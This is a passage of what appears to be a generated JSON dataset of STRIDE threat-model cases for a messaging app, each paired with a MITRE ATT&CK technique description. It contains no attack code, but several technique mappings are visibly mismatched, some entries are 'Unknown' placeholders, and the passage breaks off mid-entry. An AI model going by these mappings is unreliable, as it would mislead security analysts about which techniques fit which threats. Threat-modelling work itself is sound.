                    "Assumption": "The messaging app does not have checks in place to prevent unauthorized access by other apps.",
                    "Role": "System",
                    "Condition": "Lack of inter-process communication security mechanisms."
                }
            ],
            "Potential Impact": "Unauthorized access and control over private messaging data.",
            "MITRE ATT&CK Keywords": [
                "malicious application",
                "sandboxing failure",
                "data access",
                "privilege abuse"
            ],
            "mitre_technique": {
                "name": "Steal Application Access Token",
                "description": "Adversaries can steal application access tokens as a means of acquiring credentials to access remote systems and resources.\n\nApplication access tokens are used to make authorized API requests on behalf of a user or service and are commonly used as a way to access resources in cloud and container-based applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019)  Adversaries who steal account API tokens in cloud and containerized environments may be able to access data and perform actions with the permissions of these accounts, which can lead to privilege escalation and further compromise of the environment.\n\nFor example, in Kubernetes environments, processes running inside a container may communicate with the Kubernetes API server using service account tokens. If a container is compromised, an adversary may be able to steal the container\u2019s token and thereby gain access to Kubernetes API commands.(Citation: Kubernetes Service Accounts)  Similarly, instances within continuous-development / continuous-integration (CI/CD) pipelines will often use API tokens to authenticate to other services for testing and deployment.(Citation: Cider Security Top 10 CICD Security Risks) If these pipelines are compromised, adversaries may be able to steal these tokens and leverage their privileges.\n\nToken theft can also occur through social engineering, in which case user action may be required to grant access. OAuth is one commonly implemented framework that issues tokens to users for access to systems. An application desiring access to cloud-based services or protected APIs can gain entry using OAuth 2.0 through a variety of authorization protocols. An example commonly-used sequence is Microsoft's Authorization Code Grant flow.(Citation: Microsoft Identity Platform Protocols May 2019)(Citation: Microsoft - OAuth Code Authorization flow - June 2019) An OAuth access token enables a third-party application to interact with resources containing user data in the ways requested by the application without obtaining user credentials. \n \nAdversaries can leverage OAuth authorization by constructing a malicious application designed to be granted access to resources with the target user's OAuth token.(Citation: Amnesty OAuth Phishing Attacks, August 2019)(Citation: Trend Micro Pawn Storm OAuth 2017) The adversary will need to complete registration of their application with the authorization server, for example Microsoft Identity Platform using Azure Portal, the Visual Studio IDE, the command-line interface, PowerShell, or REST API calls.(Citation: Microsoft - Azure AD App Registration - May 2019) Then, they can send a [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002) to the target user to entice them to grant access to the application. Once the OAuth access token is granted, the application can gain potentially long-term access to features of the user account through [Application Access Token](https://attack.mitre.org/techniques/T1550/001).(Citation: Microsoft - Azure AD Identity Tokens - Aug 2019)\n\nApplication access tokens may function within a limited lifetime, limiting how long an adversary can utilize the stolen token. However, in some cases, adversaries can also steal application refresh tokens(Citation: Auth0 Understanding Refresh Tokens), allowing them to obtain new access tokens without prompting the user.  \n\n",
                "id": "attack-pattern--890c9858-598c-401d-a4d5-c67ebcdd703a",
                "technique_id": "T1528"
            }
        }
    ]
},
{
    "case_number": "13",
    "batch_number": "29",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker creates a fake version of the mobile application to trick users into installing it.",
            "Assumptions": [
                {
                    "Assumption": "Users download applications from unofficial sources",
                    "Role": "End User",
                    "Condition": "If the application is not verified or downloaded from a legitimate app store"
                },
                {
                    "Assumption": "The fake application looks convincingly similar to the original",
                    "Role": "Attacker",
                    "Condition": "If attackers have the resources to create a high-quality replica"
                },
                {
                    "Assumption": "Verification mechanisms in place are insufficient",
                    "Role": "Security Team",
                    "Condition": "IF the app lacks adequate installation security checks"
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information, data corruption or tampering, disruption to system access",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "malicious application",
                "phishing",
                "credential harvesting"
            ],
            "mitre_technique": {
                "name": "Malicious File",
                "description": "An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) and [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it.(Citation: Password Protected Word Docs) \n\nWhile [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).",
                "id": "attack-pattern--232b7f21-adf9-4b42-b936-b9d6f7df856e",
                "technique_id": "T1204.002"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker intercepts communications and impersonates a legitimate user during the setup process.",
            "Assumptions": [
                {
                    "Assumption": "Inadequate encryption of initial setup communications",
                    "Role": "Application Developer",
                    "Condition": "If the initial setup process lacks adequate encryption"
                },
                {
                    "Assumption": "Attacker is able to intercept communications",
                    "Role": "Attacker",
                    "Condition": "If the attacker has access to the network traffic between users and servers"
                },
                {
                    "Assumption": "Lack of secondary verification steps",
                    "Role": "Security Team",
                    "Condition": "If the application does not implement multi-factor authentication"
                }
            ],
            "Potential Impact": "Unauthorized access to messaging accounts, potential data theft or tampering",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "man-in-the-middle",
                "network interception",
                "credential theft"
            ],
            "mitre_technique": {
                "name": "Network Denial of Service",
                "description": "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)\n\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nFor DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499).",
                "id": "attack-pattern--d74c4a7e-ffbf-432f-9365-7ebf1f787cab",
                "technique_id": "T1498"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses social engineering to obtain a user\u2019s private key and impersonates them.",
            "Assumptions": [
                {
                    "Assumption": "Users are susceptible to social engineering attacks",
                    "Role": "End User",
                    "Condition": "If users are not properly educated on social engineering tactics"
                },
                {
                    "Assumption": "Lack of continuous security awareness training",
                    "Role": "Organization",
                    "Condition": "If ongoing training on security best practices is not provided"
                },
                {
                    "Assumption": "Private keys are not stored securely",
                    "Role": "End User",
                    "Condition": "If users do not utilize secure storage solutions"
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive communications, potential for data tampering or unauthorized disclosure",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "social engineering",
                "private key compromise",
                "credential theft"
            ],
            "mitre_technique": {
                "name": "Compromise Accounts",
                "description": "Adversaries may compromise accounts with services that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating accounts (i.e. [Establish Accounts](https://attack.mitre.org/techniques/T1585)), adversaries may compromise existing accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. \n\nA variety of methods exist for compromising accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, brute forcing credentials (ex: password reuse from breach credential dumps), or paying employees, suppliers or business partners for access to credentials.(Citation: AnonHBGary)(Citation: Microsoft DEV-0537) Prior to compromising accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.\n\nPersonas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, etc.). Compromised accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.\n\nAdversaries may directly leverage compromised email accounts for [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Phishing](https://attack.mitre.org/techniques/T1566).",
                "id": "attack-pattern--81033c3b-16a4-46e4-8fed-9b030dd03c4a",
                "technique_id": "T1586"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains access to the SQLite database on a compromised device and changes message contents or authentication credentials.",
            "Assumptions": [
                {
                    "Assumption": "Device security is compromised",
                    "Role": "End User",
                    "Condition": "If the device is lost or infected with malware"
                },
                {
                    "Assumption": "Database is not properly encrypted",
                    "Role": "Application Developer",
                    "Condition": "If encryption for the database is weak or poorly implemented"
                },
                {
                    "Assumption": "Device does not have strong access controls",
                    "Role": "Security Team",
                    "Condition": "If local device access controls are lax or insufficient"
                }
            ],
            "Potential Impact": "Data integrity compromised, potential unauthorized disclosure of sensitive information",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "database compromise",
                "message alteration",
                "malware"
            ],
            "mitre_technique": {
                "name": "Screen Capture",
                "description": "Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as <code>CopyFromScreen</code>, <code>xwd</code>, or <code>screencapture</code>.(Citation: CopyFromScreen .NET)(Citation: Antiquated Mac Malware)\n",
                "id": "attack-pattern--0259baeb-9f63-4c69-bf10-eb038c390688",
                "technique_id": "T1113"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker injects malicious code into the communication protocol to alter the message during transit.",
            "Assumptions": [
                {
                    "Assumption": "Encrypted communication channels can be compromised",
                    "Role": "Network Security",
                    "Condition": "If the communication protocol has vulnerabilities or weaknesses"
                },
                {
                    "Assumption": "Code injection prevention mechanisms are not in place",
                    "Role": "Application Developer",
                    "Condition": "If the application lacks adequate protection against code injection"
                },
                {
                    "Assumption": "Attacker has network access",
                    "Role": "Attacker",
                    "Condition": "If the attacker can intercept and modify network traffic"
                }
            ],
            "Potential Impact": "Message integrity compromised, potential unauthorized data modification",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "code injection",
                "protocol exploitation",
                "network attack"
            ],
            "mitre_technique": {
                "name": "Reflective Code Loading",
                "description": "Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk (e.g., [Shared Modules](https://attack.mitre.org/techniques/T1129)).\n\nReflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode).(Citation: Introducing Donut)(Citation: S1 Custom Shellcode Tool)(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Mandiant BYOL) For example, the `Assembly.Load()` method executed by [PowerShell](https://attack.mitre.org/techniques/T1059/001) may be abused to load raw code into the running process.(Citation: Microsoft AssemblyLoad)\n\nReflective code injection is very similar to [Process Injection](https://attack.mitre.org/techniques/T1055) except that the \u201cinjection\u201d loads code into the processes\u2019 own memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution.(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Intezer ACBackdoor)(Citation: S1 Old Rat New Tricks)",
                "id": "attack-pattern--4933e63b-9b77-476e-ab29-761bc5b7d15a",
                "technique_id": "T1620"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the application binary to disable encryption and re-distributes it to users.",
            "Assumptions": [
                {
                    "Assumption": "Modified binaries are difficult to detect",
                    "Role": "Security Team",
                    "Condition": "If existing controls do not detect tampered binaries"
                },
                {
                    "Assumption": "Users do not verify the application's integrity before installation",
                    "Role": "End User",
                    "Condition": "If installation processes do not include verification steps"
                },
                {
                    "Assumption": "The application binary is accessible for modification",
                    "Role": "Attacker",
                    "Condition": "If the attacker can access and alter the application's code"
                }
            ],
            "Potential Impact": "Data confidentiality compromised, potential for widespread unauthorized data access",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "binary modification",
                "encryption bypass",
                "application compromise"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies sending a particular message, but the system does not have proper logging to confirm or refute the claim.",
            "Assumptions": [
                {
                    "Assumption": "Lack of detailed logging",
                    "Role": "Application Developer",
                    "Condition": "If the application does not implement robust logging mechanisms"
                },
                {
                    "Assumption": "Logs are not stored securely",
                    "Role": "Security Team",
                    "Condition": "If log storage is not properly protected from tampering"
                },
                {
                    "Assumption": "There is no non-repudiation mechanism",
                    "Role": "Application Developer",
                    "Condition": "If steps to ensure non-repudiation are not integrated into the system"
                }
            ],
            "Potential Impact": "Data authenticity questioned, potential for disputes and trust erosion",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log tampering",
                "non-repudiation failure",
                "accountability"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker modifies the log entries to cover their tracks after unauthorized access.",
            "Assumptions": [
                {
                    "Assumption": "Logs are accessible to unauthorized users",
                    "Role": "Security Team",
                    "Condition": "If logs are stored in locations accessible by unauthorized individuals"
                },
                {
                    "Assumption": "Inadequate integrity checks on logs",
                    "Role": "Application Developer",
                    "Condition": "If logs lack cryptographic integrity checks"
                },
                {
                    "Assumption": "Logging mechanisms do not alert on modifications",
                    "Role": "Security Team",
                    "Condition": "If log modifications are not automatically detected and alerted"
                }
            ],
            "Potential Impact": "Disruption to incident investigation, potential concealment of malicious activities",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log modification",
                "log tampering",
                "evidence destruction"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A compromised companion device logs false entries to mislead investigations into a security breach.",
            "Assumptions": [
                {
                    "Assumption": "Companion devices have lower security controls",
                    "Role": "Security Team",
                    "Condition": "If security between primary and companion devices is not consistent"
                },
                {
                    "Assumption": "Log entries from companion devices are trusted without verification",
                    "Role": "Application Developer",
                    "Condition": "If the system blindly trusts log entries from any linked device"
                },
                {
                    "Assumption": "There are no cross-device integrity checks",
                    "Role": "Security Team",
                    "Condition": "If there are no mechanisms to verify event origin across all linked devices"
                }
            ],
            "Potential Impact": "Investigation redirection, potential failure to identify the true source of an attack",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "false logging",
                "device trust",
                "cross-device attacks"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker accesses unencrypted backups of SQLite databases, revealing sensitive messages and credentials.",
            "Assumptions": [
                {
                    "Assumption": "Backups are not encrypted",
                    "Role": "Application Developer",
                    "Condition": "If backup processes do not implement encryption"
                },
                {
                    "Assumption": "Database files are easily accessible",
                    "Role": "End User",
                    "Condition": "If backup files are stored without proper access controls"
                },
                {
                    "Assumption": "Users are not aware of the need to secure backups",
                    "Role": "End User",
                    "Condition": "If there is insufficient user education on securing backups"
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive user information",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "backup exploitation",
                "data breach",
                "sensitive data exposure"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits a vulnerability in the encryption protocol, allowing them to decrypt intercepted communications.",
            "Assumptions": [
                {
                    "Assumption": "Encryption protocols have vulnerabilities",
                    "Role": "Application Developer",
                    "Condition": "If the encryption protocols are not regularly reviewed and updated"
                },
                {
                    "Assumption": "Attacker has the capability to exploit these vulnerabilities",
                    "Role": "Attacker",
                    "Condition": "If the attacker possesses the necessary technical skill and resources"
                },
                {
                    "Assumption": "Communications can be intercepted",
                    "Role": "Attacker",
                    "Condition": "If the attacker has access to the network traffic"
                }
            ],
            "Potential Impact": "Compromise of all intercepted communications, leading to unauthorized data access",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "encryption protocol attack",
                "data interception",
                "vulnerability exploitation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker uses malware to access plaintext copies of messages stored temporarily on the device before encryption.",
            "Assumptions": [
                {
                    "Assumption": "Malware is able to access sensitive application data",
                    "Role": "Attacker",
                    "Condition": "If the device is compromised by malware"
                },
                {
                    "Assumption": "Sensitive data is stored in plaintext even temporarily",
                    "Role": "Application Developer",
                    "Condition": "If the application stores unencrypted data at any stage"
                },
                {
                    "Assumption": "Security software does not detect the malware",
                    "Role": "End User",
                    "Condition": "If the security solutions are not effective"
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive message content prior to encryption",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "malware",
                "plaintext data access",
                "data leakage"
            ],
            "mitre_technique": {
                "name": "Screen Capture",
                "description": "Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as <code>CopyFromScreen</code>, <code>xwd</code>, or <code>screencapture</code>.(Citation: CopyFromScreen .NET)(Citation: Antiquated Mac Malware)\n",
                "id": "attack-pattern--0259baeb-9f63-4c69-bf10-eb038c390688",
                "technique_id": "T1113"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker initiates a Distributed Denial of Service (DDoS) attack against the messaging service infrastructure, rendering it inaccessible.",
            "Assumptions": [
                {
                    "Assumption": "The service infrastructure can be overwhelmed",
                    "Role": "Security Team",
                    "Condition": "If the infrastructure lacks adequate DDoS protection"
                },
                {
                    "Assumption": "Attackers have the capability to launch large-scale attacks",
                    "Role": "Attacker",
                    "Condition": "If attackers have access to resources to initiate DDoS attacks"
                },
                {
                    "Assumption": "Network traffic cannot be adequately filtered",
                    "Role": "Network Administrator",
                    "Condition": "If traffic filtering mechanisms are insufficient"
                }
            ],
            "Potential Impact": "Disruption to services and system access, leading to communication outage",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "infrastructure attack",
                "network flood"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a vulnerability in the desktop client to crash the application and prevent its use.",
            "Assumptions": [
                {
                    "Assumption": "Exploitable vulnerabilities exist in the client application",
                    "Role": "Application Developer",
                    "Condition": "If the desktop client is not regularly updated and patched"
                },
                {
                    "Assumption": "Attackers have knowledge of these vulnerabilities",
                    "Role": "Attacker",
                    "Condition": "If vulnerabilities are publicly known or discovered through reverse engineering"
                },
                {
                    "Assumption": "Users rely on the desktop client heavily",
                    "Role": "End User",
                    "Condition": "If users depend on the desktop client for regular communication"
                }
            ],
            "Potential Impact": "Temporary unavailability of messaging services through the affected client",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "application crash",
                "vulnerability exploitation",
                "client application"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker sends a large volume of invalid messages to the server, exhausting its resources and causing service disruption.",
            "Assumptions": [
                {
                    "Assumption": "The server is susceptible to resource exhaustion attacks",
                    "Role": "Application Developer",
                    "Condition": "If the server cannot handle large volumes of invalid traffic"
                },
                {
                    "Assumption": "Attackers can generate and send invalid messages",
                    "Role": "Attacker",
                    "Condition": "If attackers can bypass input validation mechanisms"
                },
                {
                    "Assumption": "There are insufficient rate limiting mechanisms",
                    "Role": "Security Team",
                    "Condition": "If the application lacks rate limiting to prevent abuse"
                }
            ],
            "Potential Impact": "Service disruption, preventing legitimate communications",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "resource exhaustion",
                "server overload",
                "invalid traffic"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker finds and exploits a vulnerability in the mobile application to gain root access to the device.",
            "Assumptions": [
                {
                    "Assumption": "Vulnerabilities allow privilege escalation",
                    "Role": "Application Developer",
                    "Condition": "If security flaws exist in the application"
                },
                {
                    "Assumption": "Attackers can exploit these vulnerabilities",
                    "Role": "Attacker",
                    "Condition": "If attackers have the necessary technical capability and resources"
                },
                {
                    "Assumption": "Users have not applied security patches",
                    "Role": "End User",
                    "Condition": "If users do not regularly update their applications"
                }
            ],
            "Potential Impact": "Complete control over the device, unauthorized data access and manipulation",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "root access",
                "vulnerability exploitation",
                "mobile device"
            ],
            "mitre_technique": {
                "name": "Securityd Memory",
